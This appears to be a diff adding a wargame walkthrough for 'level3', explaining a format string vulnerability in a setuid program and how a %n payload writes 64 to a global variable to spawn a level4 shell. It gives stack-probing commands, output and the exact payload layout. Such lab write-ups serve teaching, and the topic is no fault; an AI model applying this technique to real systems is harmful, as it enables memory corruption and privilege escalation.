@@ -1,0 +1,49 @@
+# Level3 Exploitation Walkthrough
+
+## Vulnerability Analysis
+**Type**: Format String Vulnerability  
+**Location**: `printf(buffer)` - user input used directly as format string  
+**Impact**: Arbitrary memory write capability  
+
+## Key Discovery
+- Program checks global variable at `0x804988c`
+- Must equal 64 (0x40) to trigger `system("/bin/sh")`
+- Format string allows writing to arbitrary memory addresses
+
+## Exploitation Process
+
+### Step 1: Stack Layout Discovery
+```bash
+echo "AAAA%x.%x.%x.%x" | ./level3
+# Output: AAAA200.b7fd1ac0.b7ff37d0.41414141
+# Finding: Our input (AAAA = 0x41414141) appears at position 4
+```
+
+### Step 2: Format String Attack Construction
+**Goal**: Write value 64 to address `0x804988c`  
+**Method**: Use `%n` to write character count to memory  
+**Payload**: `[TARGET_ADDR][PADDING]%4$n`
+
+### Step 3: Payload Calculation
+- **Target Address**: `\x8c\x98\x04\x08` (4 bytes)
+- **Padding**: 60 'A' characters  
+- **Total**: 64 characters before `%4$n`
+- **Effect**: `%4$n` writes 64 to address at stack position 4
+
+### Step 4: Successful Exploitation
+```bash
+(python2 exploit.py; cat) | ./level3
+# Result: "Wait what?!" + level4 shell spawned
+```
+
+## Technical Concepts Demonstrated
+- **Format String Vulnerabilities**: `%x`, `%n` format specifiers
+- **Stack Layout Analysis**: Finding input position on stack  
+- **Write-What-Where Attack**: Arbitrary memory write via format strings
+- **Condition Bypass**: Modifying program flow via memory corruption
+- **SUID Privilege Escalation**: Leveraging setuid binaries
+
+## Security Impact
+- **Arbitrary Code Execution**: Via `system()` call
+- **Privilege Escalation**: level3 → level4 via SUID bit
+- **Memory Corruption**: Direct write to global variables
